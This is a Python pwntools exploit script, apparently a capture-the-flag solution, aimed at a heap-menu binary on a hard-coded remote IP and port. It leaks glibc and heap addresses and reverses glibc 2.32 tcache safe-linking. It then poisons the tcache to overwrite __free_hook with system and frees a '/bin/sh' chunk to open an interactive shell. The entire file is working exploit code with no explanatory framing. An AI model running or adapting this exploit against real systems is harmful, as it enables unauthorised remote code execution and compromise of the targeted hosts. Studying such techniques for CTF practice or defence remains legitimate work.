import pwn
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

# pwn.context.arch = "amd64"
# elf = pwn.context.binary = pwn.ELF("./spaghetti")
# for link in elf.symbols:
#     print(link)
# print(elf.sym.__libc_system) 
# print(elf.sym.__free_hook)
# pwn.context.terminal = ['tmux', 'splitw', '-h']
binaryname = "./encrypted"

# pwn.libcdb.unstrip_libc("./libc.so.6")

#p=process(binaryname)
p=pwn.remote("207.154.239.148", 1370)
# p=pwn.gdb.debug(binaryname, gdbscript=gs)
# p=pwn.gdb.debug(binaryname)
# p=pwn.process(binaryname)
#gdb.attach(p)

def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    # r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3#+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def readLeak(resp):
    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
    paddedleak = rawleak.ljust(8, b'\x00')
    leak = pwn.u64(paddedleak)
    leak = decrypt(leak)
    return leak

def readLeakNorm(resp):
    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
    paddedleak = rawleak.ljust(8, b'\x00')
    leak = pwn.u64(paddedleak)
    #leak = decrypt(leak)
    return leak

def decrypt(cipher):
    key=0
    for i in range(1,6):
        bits=64-12*i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain
#glibc 2.32 tcache addresses are stored as address ^ (chunk_address>>12)

def encrypt(target_address, heap_address):
    return (target_address ^ heap_address >> 12)


print("malloc-ing")
malloc(0, 1049) # malloc first big chunk
malloc(1, 24)

print("free-ing")
free(0)

malloc(2, 1070) # malloc slightly larger chunk
malloc(3, 24)
malloc(4, 24)

view_leak = view(0)
leak = readLeakNorm(view_leak)
print(f"glibc leak: {hex(leak)}")

offset = 0x1e3ff0
glibc_base = leak - offset 

free(1)
free(3)
heap_address = readLeak(view(3))

print(f"heap leak: {hex(heap_address)}")

freehook_offset = 0x001e6e40

system_offset = 0x000503c0

system_address = glibc_base + system_offset

freehook_address = encrypt(glibc_base + freehook_offset, heap_address)

# input("freezing to check gdb")

edit(4, b"/bin/sh")
edit(3, pwn.p64(freehook_address))
malloc(10, 24)
malloc(11, 24)
edit(11, pwn.p64(system_address))
free(4)

p.interactive()